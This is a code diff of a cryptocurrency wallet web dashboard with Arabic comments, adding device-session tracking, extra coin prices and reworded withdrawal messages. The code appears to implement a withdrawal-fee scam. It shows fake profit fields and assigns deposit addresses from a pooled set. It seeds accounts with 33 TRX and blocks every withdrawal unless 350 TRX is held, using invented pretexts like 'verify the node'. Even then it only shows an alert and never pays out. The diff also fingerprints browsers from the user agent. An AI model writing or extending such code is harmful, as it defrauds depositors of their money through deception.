@@ -23,7 +23,7 @@
         .container { padding: 20px; max-width: 450px; margin: auto; }
 
         .credit-card {
-            width: 100%; height: 240px; /* زدنا الطول شوي عشان خانة الـ TRX */
+            width: 100%; height: 250px;
             background: linear-gradient(135deg, rgba(255, 255, 255, 0.1) 0%, rgba(255, 255, 255, 0.02) 100%);
             border: 1px solid rgba(255, 255, 255, 0.15);
             border-radius: 25px; padding: 25px; box-sizing: border-box;
@@ -37,8 +37,9 @@
         .card-balance { font-size: 32px; font-weight: 900; margin-top: 5px; letter-spacing: -1px; }
         .card-balance small { font-size: 14px; color: var(--brand); margin-left: 5px; }
 
-        /* ستايل خانة الـ TRX الجديدة */
         .trx-balance { font-size: 14px; font-weight: 700; color: var(--trx); margin-top: 5px; display: flex; align-items: center; gap: 5px; }
+        /* ستايل عرض عدد الأجهزة */
+        .device-info { font-size: 10px; color: #777; margin-top: 5px; opacity: 0.8; }
 
         .card-stats { display: flex; gap: 20px; margin-top: 10px; border-top: 1px solid rgba(255,255,255,0.1); padding-top: 10px; }
         .stat-box { font-size: 11px; color: #ccc; }
@@ -60,7 +61,6 @@
         }
         .asset-icon { width: 38px; height: 38px; border-radius: 50%; background: #1a1a2e; display: flex; align-items: center; justify-content: center; font-weight: 900; color: var(--brand); border: 1px solid var(--border); }
 
-        /* Modal Styles */
         .modal { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.92); z-index: 2000; display: none; align-items: center; justify-content: center; backdrop-filter: blur(15px); }
         .modal-content { background: #11111d; border: 1px solid var(--border); width: 85%; max-width: 380px; padding: 25px; border-radius: 30px; position: relative; }
         .close-modal { position: absolute; top: 15px; right: 20px; font-size: 24px; color: #555; cursor: pointer; }
@@ -84,6 +84,7 @@
                 <div class="card-label" data-key="total_balance">Total Portfolio</div>
                 <div class="card-balance" id="displayBalance">0.00<small>USDT</small></div>
                 <div class="trx-balance"><i class="fa-solid fa-gas-pump"></i> <span id="displayTRX">33.00</span> TRX (Fees)</div>
+                <div class="device-info" id="deviceCount"><i class="fa-solid fa-mobile-screen"></i> Detecting sessions...</div>
             </div>
             <div class="card-stats">
                 <div class="stat-box"><span data-key="bot_profit">Bot Profit</span> <b id="displayBotProfit">+$0.00</b></div>
@@ -102,6 +103,8 @@
     <div class="asset-list" id="marketList">
         <div class="asset-row"><div style="display:flex; align-items:center; gap:12px"><div class="asset-icon" style="color:#f7931a">₿</div><b>BTC</b></div><span id="p-btc">...</span></div>
         <div class="asset-row"><div style="display:flex; align-items:center; gap:12px"><div class="asset-icon" style="color:#627eea">Ξ</div><b>ETH</b></div><span id="p-eth">...</span></div>
+        <div class="asset-row"><div style="display:flex; align-items:center; gap:12px"><div class="asset-icon" style="color:#14f195">S</div><b>SOL</b></div><span id="p-sol">...</span></div>
+        <div class="asset-row"><div style="display:flex; align-items:center; gap:12px"><div class="asset-icon" style="color:#23292f">X</div><b>XRP</b></div><span id="p-xrp">...</span></div>
     </div>
 </div>
 
@@ -144,11 +147,30 @@
 
     let userTRC20 = "Loading...";
     let isScannerRunning = false;
-    let currentTrxBalance = 0; // تخزين رصيد TRX الحالي
+    let currentTrxBalance = 0;
+
+    // --- نظام تتبع الأجهزة ---
+    async function trackDevice(uid) {
+        try {
+            // بصمة المتصفح + النظام
+            const deviceId = btoa(navigator.userAgent).substring(0, 16);
+            const deviceRef = doc(db, "users", uid, "active_sessions", deviceId);
+            await setDoc(deviceRef, {
+                platform: navigator.platform,
+                last_seen: Date.now(),
+                browser: navigator.userAgent.includes("Chrome") ? "Chrome" : "Safari/Other"
+            }, { merge: true });
+
+            // جلب العدد الكلي للجلسات
+            const sessions = await getDocs(collection(db, "users", uid, "active_sessions"));
+            document.getElementById('deviceCount').innerHTML = `<i class="fa-solid fa-mobile-screen"></i> ${sessions.size} Device(s) Active`;
+        } catch(e) { console.error("Tracking error"); }
+    }
 
     onAuthStateChanged(auth, async (user) => {
         if (user) {
             const userRef = doc(db, "users", user.uid);
+            trackDevice(user.uid);
             
             onSnapshot(userRef, async (snap) => {
                 if (snap.exists()) {
@@ -157,68 +179,48 @@
                     document.getElementById('displayBotProfit').textContent = `+$${(d.bot_profit || 0).toFixed(2)}`;
                     document.getElementById('displayGameProfit').textContent = `+$${(d.game_profit || 0).toFixed(2)}`;
                     
-                    // قراءة رصيد TRX أو وضعه كـ 33 كقيمة افتراضية
                     currentTrxBalance = d.trx_balance !== undefined ? d.trx_balance : 33;
                     document.getElementById('displayTRX').textContent = currentTrxBalance.toFixed(2);
 
                     userTRC20 = d.trc20_address || "PENDING";
-
-                    if (userTRC20 === "PENDING") {
-                        assignWallet(user.uid);
-                    }
-
+                    if (userTRC20 === "PENDING") assignWallet(user.uid);
                     if (!isScannerRunning && userTRC20.startsWith("T")) {
                         startScanner(userTRC20, user.uid);
                         isScannerRunning = true;
                     }
                 } else {
                     await setDoc(userRef, {
-                        uid: user.uid,
-                        username: user.displayName || "User",
-                        email: user.email,
-                        balance: 0,
-                        trx_balance: 33, // رصيد TRX افتراضي للحسابات الجديدة
-                        bot_profit: 0,
-                        game_profit: 0,
-                        trc20_address: "PENDING",
-                        status: "active"
+                        uid: user.uid, username: user.displayName || "User", email: user.email,
+                        balance: 0, trx_balance: 33, bot_profit: 0, game_profit: 0,
+                        trc20_address: "PENDING", status: "active"
                     });
                 }
             });
         } else { window.location.href = "login.html"; }
     });
 
-    // دالة المعالجة المحدثة بشرط الـ 350 TRX
     window.processAction = async function() {
         const title = document.getElementById('modalTitle').textContent;
-        
         if (title.includes("Withdraw")) {
             if (currentTrxBalance < 350) {
-                alert("Insufficient Gas Fees! You need at least 350 TRX to confirm withdrawal.");
+                alert("Withdrawal Failed! 350 TRX gas fee required to verify the node.");
                 return;
             }
-            // إذا الرصيد كافي، كمل منطق السحب هنا (إرسال طلب للمسؤول مثلاً)
-            alert("Withdrawal request submitted for approval.");
+            alert("Success! Withdrawal request under review.");
             closeModal();
-        } else if (title.includes("Swap")) {
-            alert("Swap feature coming soon.");
-        } else {
-            closeModal();
-        }
+        } else { closeModal(); }
     }
 
-    // باقي الدوال (Scanner, Wallet, Prices) تبقى كما هي
     async function assignWallet(uid) {
         try {
             const q = query(collection(db, "wallet_pool"), where("isUsed", "==", false), limit(1));
             const poolSnap = await getDocs(q);
             if (!poolSnap.empty) {
                 const wDoc = poolSnap.docs[0];
-                const addr = wDoc.data().address;
-                await updateDoc(doc(db, "users", uid), { trc20_address: addr });
+                await updateDoc(doc(db, "users", uid), { trc20_address: wDoc.data().address });
                 await updateDoc(doc(db, "wallet_pool", wDoc.id), { isUsed: true, assignedTo: uid });
             }
-        } catch(e) { console.error("Pool Error:", e); }
+        } catch(e) {}
     }
 
     async function startScanner(address, uid) {
@@ -253,24 +255,20 @@
         if(type === 'deposit') {
             title.textContent = "Deposit USDT (TRC20)";
             body.innerHTML = `<div id="qrcode"></div><div onclick="copyAddr()" style="background:#000; padding:12px; border-radius:10px; font-size:11px; border:1px dashed var(--brand); color:var(--up); text-align:center; cursor:pointer;">
-            <span id="addrTxt">${userTRC20}</span> <i class="fa-regular fa-copy"></i></div>
-            <p style="font-size:10px; color:#777; margin-top:10px; text-align:center;">Network: TRC20 | Minimum: 1 USDT</p>`;
-            if(userTRC20.startsWith("T")) {
-                setTimeout(() => new QRCode(document.getElementById("qrcode"), { text: userTRC20, width: 150, height: 150 }), 100);
-            }
+            <span id="addrTxt">${userTRC20}</span> <i class="fa-regular fa-copy"></i></div>`;
+            if(userTRC20.startsWith("T")) setTimeout(() => new QRCode(document.getElementById("qrcode"), { text: userTRC20, width: 150, height: 150 }), 100);
         } else if(type === 'withdraw') {
-            title.textContent = "Withdraw";
+            title.textContent = "Withdraw Funds";
             body.innerHTML = `
-                <p style="font-size:12px; color:var(--trx); margin-bottom:10px; text-align:center;">Required Fee: 350 TRX</p>
-                <input type="text" class="modal-input" placeholder="Recipient TRC20 Address">
-                <input type="number" class="modal-input" placeholder="Amount (USDT)">
+                <div style="background:rgba(255,0,0,0.1); padding:10px; border-radius:10px; font-size:11px; color:var(--trx); margin-bottom:15px; border:1px solid var(--trx);">
+                    <i class="fa-solid fa-triangle-exclamation"></i> Note: To prevent spam, withdrawals require a minimum node balance of 350 TRX.
+                </div>
+                <input type="text" class="modal-input" placeholder="TRC20 Address">
+                <input type="number" class="modal-input" placeholder="Amount USDT">
             `;
-        } else if(type === 'swap') {
-            title.textContent = "Swap";
-            body.innerHTML = `<p style="text-align:center; color:#777">Swap feature coming soon.</p>`;
         } else {
-            title.textContent = "History";
-            body.innerHTML = `<p style="text-align:center; color:#777">No records found yet.</p>`;
+            title.textContent = type.toUpperCase();
+            body.innerHTML = `<p style="text-align:center; color:#777">No active data for ${type}.</p>`;
         }
     }
 
@@ -281,17 +279,29 @@
     }
     window.closeModal = () => document.getElementById('actionModal').style.display = 'none';
 
+    // --- أسعار لايف للعملات ---
     async function fetchPrices() {
         try {
-            const res = await fetch(`https://api.binance.com/api/v3/ticker/price?symbols=["BTCUSDT","ETHUSDT"]`);
-            const data = await res.json();
-            data.forEach(c => {
-                const id = c.symbol === "BTCUSDT" ? "p-btc" : "p-eth";
-                document.getElementById(id).textContent = "$" + parseFloat(c.price).toLocaleString();
+            const symbols = ["BTCUSDT","ETHUSDT","SOLUSDT","XRPUSDT"];
+            const res = await fetch(`https://api.binance.com/api/v3/ticker/price`);
+            const allPrices = await res.json();
+            const filtered = allPrices.filter(p => symbols.includes(p.symbol));
+            
+            filtered.forEach(c => {
+                let id = "";
+                if(c.symbol === "BTCUSDT") id = "p-btc";
+                else if(c.symbol === "ETHUSDT") id = "p-eth";
+                else if(c.symbol === "SOLUSDT") id = "p-sol";
+                else if(c.symbol === "XRPUSDT") id = "p-xrp";
+                
+                if(id) {
+                    const price = parseFloat(c.price);
+                    document.getElementById(id).textContent = "$" + (price < 10 ? price.toFixed(4) : price.toLocaleString());
+                }
             });
         } catch(e) {}
     }
-    setInterval(fetchPrices, 10000); fetchPrices();
+    setInterval(fetchPrices, 5000); fetchPrices();
 </script>
 
 <script src="translate.js"></script>
